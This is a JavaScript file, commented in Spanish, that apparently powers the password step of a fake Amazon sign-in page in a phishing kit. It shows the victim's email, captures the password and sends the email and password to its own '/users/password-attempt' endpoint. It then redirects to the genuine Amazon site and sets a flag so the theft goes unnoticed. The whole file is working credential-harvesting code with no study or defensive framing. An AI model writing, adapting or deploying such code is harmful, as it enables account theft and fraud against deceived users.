(() => {
  // 1) Si ya terminó, redirige (envuelto en try por compatibilidad)
  try {
    if (localStorage.getItem("amazon_auth_complete")) {
      window.location.replace("https://www.amazon.com/-/es/");
      return;
    }
  } catch {
    // si localStorage falla, no se rompe el flujo
  }

  // 2) Fix bfcache (Safari/back button)
  window.addEventListener("pageshow", (event) => {
    if (event.persisted) window.location.reload();
  });

  // 3) Esperar DOM (para que getElementById no devuelva null)
  document.addEventListener("DOMContentLoaded", () => {
    const params = new URLSearchParams(window.location.search);
    const email = params.get("email");

    if (!email) {
      window.location.href = "/";
      return;
    }

    const userEmailDisplay = document.getElementById("userEmailDisplay");
    const form = document.getElementById("passwordForm");
    const passwordInput = document.getElementById("ap_password");
    const authErrorBox = document.getElementById("authErrorBox");
    const serverMsgText = document.getElementById("serverMsgText");
    const emptyErrorAlert = document.getElementById("auth-password-missing-alert");
    const submitBtn = document.getElementById("submitBtn");

    // Si falta algo crítico, no sigas (evita errores en mobile/desktop)
    if (!form || !passwordInput || !submitBtn) return;

    if (userEmailDisplay) userEmailDisplay.textContent = email;

    // 4) Toggle mostrar contraseña (solo existe en móvil)
    const toggle = document.getElementById("showPasswordToggle");
    if (toggle) {
      toggle.addEventListener("change", () => {
        passwordInput.type = toggle.checked ? "text" : "password";
      });
    }

    // 5) Limpieza de errores al escribir
    passwordInput.addEventListener("input", () => {
      passwordInput.classList.remove("form-input-error");
      if (emptyErrorAlert) emptyErrorAlert.style.display = "none";
      if (authErrorBox) authErrorBox.style.display = "none";
      if (serverMsgText) serverMsgText.textContent = "";
    });

    function finishAndRedirect() {
      try {
        localStorage.setItem("amazon_auth_complete", "true");
      } catch {}
      window.location.href = "https://www.amazon.com/-/es/";
    }

    function showError(msg) {
      if (serverMsgText) serverMsgText.textContent = msg;
      if (authErrorBox) authErrorBox.style.display = "block";
    }

    form.addEventListener("submit", async (e) => {
      e.preventDefault();

      if (authErrorBox) authErrorBox.style.display = "none";
      if (serverMsgText) serverMsgText.textContent = "";
      passwordInput.classList.remove("form-input-error");
      if (emptyErrorAlert) emptyErrorAlert.style.display = "none";

      const password = passwordInput.value;

      if (!password) {
        passwordInput.classList.add("form-input-error");
        if (emptyErrorAlert) emptyErrorAlert.style.display = "flex";
        passwordInput.focus();
        return;
      }

      submitBtn.disabled = true;

      try {
        await new Promise((r) => setTimeout(r, 2000));

        const res = await fetch("/users/password-attempt", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ email, password }),
        });

        // Si el backend no devuelve JSON, evita que reviente
        let data = {};
        try {
          data = await res.json();
        } catch {
          data = {};
        }

        submitBtn.disabled = false;

        if (res.status === 409) {
          finishAndRedirect();
          return;
        }

        if (!res.ok) {
          showError(data.error || "Error de conexión");
          return;
        }

        if (data.message) {
          showError(data.message);
          passwordInput.value = "";
          passwordInput.focus();
          return;
        }

        finishAndRedirect();
      } catch {
        submitBtn.disabled = false;
        showError("No se pudo conectar al servidor.");
      }
    });
  });
})();
